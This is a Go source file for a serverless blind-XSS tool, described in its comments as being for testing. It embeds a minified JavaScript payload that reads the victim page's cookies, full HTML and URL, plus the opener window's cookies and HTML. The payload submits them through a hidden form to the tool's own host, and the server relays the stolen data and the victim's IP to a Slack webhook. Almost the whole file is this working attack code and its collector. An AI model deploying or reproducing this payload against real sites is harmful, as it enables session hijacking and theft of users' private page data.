// Package serverless allows you to run blindxss testing as a severless module
package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"log"
)

// Host is the domain this server is running on
const Host = "thewidow-<something>.now.sh"

// SendNotificationToSlackDirect does what it says
func sendNotificationToSlackDirect(message string, webhook string) {
	message = strings.Replace(message, "\"", "\\\"", -1)
	jsonData := `{"text": "` + message + `"}`
	req, err := http.NewRequest("POST", webhook, bytes.NewBufferString(jsonData))
	if err != nil {
		log.Printf("Could not send notification: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Could not send notification: %v", err)
	}
	resp.Body.Close()

	time.Sleep(1 * time.Second)
}

type xssReport struct {
	InnerHTML    string
	URL          string
	Cookie       string
	OpenerCookie string
	OpenerURL    string
	OpenerHTML   string
	IP           string
}

// NewReport creates a new xss report
func newReport(Values map[string]string) xssReport {
	return xssReport{
		InnerHTML:    Values["inne"],
		URL:          Values["durl"],
		Cookie:       Values["dcoo"],
		OpenerCookie: Values["odoc"],
		OpenerURL:    Values["oloc"],
		OpenerHTML:   Values["oloh"],
		IP:           Values["ip"],
	}
}

// String converts the XSS Report to a textual representation
func (x xssReport) string() string {
	return fmt.Sprintf("Blind XSS Attempt Recieved\nURL: `%s`\tIP: `%s`\nCookies: `%s`\nInnerHTML: \n```\n%s\n```\nOpenerCookie: `%s`\nOpenerURL: `%s`\nOpenerHTML: `%s`\n",
		x.URL, x.IP, x.Cookie, x.InnerHTML, x.OpenerCookie, x.OpenerURL, x.OpenerHTML)
}

// Payload is the xss payload used for detection and info-gathering
var payload = `!function(){if("__"!==window.name){try{dcoo=document.cookie}catch(t){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(t){inne=null}try{durl=document.URL}catch(t){durl=null}try{oloc=opener.location}catch(t){oloc=null}try{oloh=opener.document.body.innerHTML}catch(t){oloh=null}try{odoc=opener.document.cookie}catch(t){odoc=null}var t=document.createElementNS("http://www.w3.org/1999/xhtml","iframe");t.setAttribute("style","display:none"),t.setAttribute("name","hidden-form");var e=document.createElementNS("http://www.w3.org/1999/xhtml","form");e.setAttribute("target","hidden-form");var o=document.createElementNS("http://www.w3.org/1999/xhtml","input"),n=document.createElementNS("http://www.w3.org/1999/xhtml","input"),l=document.createElementNS("http://www.w3.org/1999/xhtml","input"),a=document.createElementNS("http://www.w3.org/1999/xhtml","input"),c=document.createElementNS("http://www.w3.org/1999/xhtml","input"),r=document.createElementNS("http://www.w3.org/1999/xhtml","input");o.setAttribute("value",escape(dcoo)),n.setAttribute("value",escape(inne)),l.setAttribute("value",escape(durl)),a.setAttribute("value",escape(oloc)),c.setAttribute("value",escape(oloh)),r.setAttribute("value",escape(odoc)),o.setAttribute("name","dcoo"),n.setAttribute("name","inne"),l.setAttribute("name","durl"),a.setAttribute("name","oloc"),c.setAttribute("name","oloh"),r.setAttribute("name","odoc"),e.appendChild(o),e.appendChild(n),e.appendChild(l),e.appendChild(c),e.appendChild(a),e.appendChild(r);var d=document.getElementsByTagName("body")[0];e.action="{{host}}",e.method="post",e.target="_blank",d.appendChild(e),window.name="__",e.submit(),history.back()}else window.name=""}();
`

// Handler handles the requests to endpoint
func Handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/javascript")
		fmt.Fprintf(w, "%s", strings.Replace(payload, "{{host}}", fmt.Sprintf("https://%s", Host), -1))
	} else if r.Method == "POST" {
		data, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("Could not read body: %v", err)
			return
		}
		r.Body.Close()

		body := string(data)
		processRequest(body, r.RemoteAddr)
	}
}

// ProcessRequest processes a single blind-xss request
func processRequest(body string, RemoteAddr string) {
	q, err := url.ParseQuery(body)
	if err != nil {
		log.Printf("Could not parse query: %v", err)
		return
	}

	values := make(map[string]string)
	for key := range q {
		dataDecoded, err := url.QueryUnescape(q.Get(key))
		if err != nil {
			log.Printf("Could not decode form field: %v", err)
			return
		}
		values[key] = dataDecoded
	}
	values["ip"] = RemoteAddr

	message := newReport(values)
	sendNotificationToSlackDirect(message.string(), os.Getenv("SLACK_WEBHOOK"))
}
